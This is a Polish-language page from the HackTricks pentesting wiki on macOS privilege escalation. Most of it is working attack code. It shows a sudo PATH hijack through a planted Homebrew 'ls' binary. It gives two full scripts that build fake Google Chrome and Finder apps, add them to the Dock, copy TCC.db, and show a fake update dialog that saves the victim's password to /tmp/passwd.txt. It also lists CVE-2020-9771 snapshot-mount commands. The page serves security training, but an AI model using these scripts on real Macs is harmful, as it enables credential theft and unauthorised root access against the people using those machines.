# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Jeśli przyszedłeś tutaj szukając eskalacji uprawnień TCC, przejdź do:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Proszę zauważyć, że **większość sztuczek dotyczących eskalacji uprawnień wpływających na Linux/Unix wpłynie również na maszyny MacOS**. Zobacz więc:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Możesz znaleźć oryginalną [technikę Sudo Hijacking w poście o eskalacji uprawnień Linux](../../linux-hardening/privilege-escalation/#sudo-hijacking).

Jednak macOS **zachowuje** **`PATH`** użytkownika, gdy wykonuje **`sudo`**. Co oznacza, że innym sposobem na przeprowadzenie tego ataku byłoby **przejęcie innych binarek**, które ofiara nadal wykona podczas **uruchamiania sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Zauważ, że użytkownik korzystający z terminala prawdopodobnie ma **zainstalowany Homebrew**. Możliwe jest więc przejęcie binarek w **`/opt/homebrew/bin`**.

### Podszywanie się pod Dock

Używając pewnych **techniki społecznego inżynierii**, możesz **podszyć się na przykład pod Google Chrome** w docku i faktycznie wykonać swój własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź w Docku, czy jest Chrome, a w takim przypadku **usuń** ten wpis i **dodaj** **fałszywy** **wpis Chrome w tej samej pozycji** w tablicy Dock.&#x20;
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- Nie **możesz usunąć Findera z Docka**, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Findera tuż obok prawdziwego. W tym celu musisz **dodać fałszywy wpis Findera na początku tablicy Docka**.
- Inną opcją jest nie umieszczanie go w Docku i po prostu otwarcie go, "Finder prosi o kontrolę Findera" nie jest takie dziwne.
- Inną opcją na **eskalację do roota bez pytania** o hasło z oknem dialogowym, jest sprawienie, by Finder naprawdę poprosił o hasło do wykonania uprzywilejowanej akcji:
- Poproś Findera o skopiowanie do **`/etc/pam.d`** nowego pliku **`sudo`** (Okno dialogowe pytające o hasło wskaże, że "Finder chce skopiować sudo")
- Poproś Findera o skopiowanie nowego **Pluginu Autoryzacji** (Możesz kontrolować nazwę pliku, aby okno dialogowe pytające o hasło wskazywało, że "Finder chce skopiować Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

## TCC - Eskalacja uprawnień roota

### CVE-2020-9771 - obejście TCC mount_apfs i eskalacja uprawnień

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować migawkę Time Machine oraz **uzyskać dostęp do WSZYSTKICH plików** tej migawki.\
**Jedynym wymaganym uprawnieniem** jest to, aby aplikacja używana (jak `Terminal`) miała dostęp **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), co musi być przyznane przez administratora.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Wrażliwe informacje

To może być przydatne do eskalacji uprawnień:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
